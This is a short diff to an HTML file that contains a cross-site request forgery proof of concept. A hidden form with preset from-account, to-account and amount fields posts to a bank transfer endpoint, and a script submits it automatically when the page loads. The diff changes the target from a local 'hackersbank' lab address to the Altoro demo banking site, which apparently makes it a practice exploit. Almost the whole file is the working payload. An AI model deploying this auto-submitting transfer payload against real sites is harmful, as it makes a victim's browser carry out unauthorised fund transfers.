@@ -1,13 +1,12 @@
 <html>
 <body>
-<form ENCTYPE="application/x-www-form-urlencoded" name="foo" method="POST" action="http://192.168.2.13/hackersbank/FundTransfer.aspx">
-
-      <input type="hidden" name="dDListFromAccnum" value="5505501"/>
-			<input type="hidden" name="dDListToAccnum" value="500019"/>
-			<input type="hidden" name="txtAmount" value="77"/>
-			<input type="hidden" name="btnSubmit" value="Submit"/>
+		<form method="POST"  name="foo" action="https://altoro.testfire.net/bank/doTransfer">
+			<input type="hidden" name="fromAccount" value="800000"/>
+			<input type="hidden" name="toAccount" value="800002"/>
+			<input type="hidden" name="transferAmount" value="30"/>
+			<input type="hidden" name="transfer" value="Transfer+Money"/>
 			<input type="submit" value="Submit">
-</form>
+
 <script>
 document.foo.submit();
 </script>
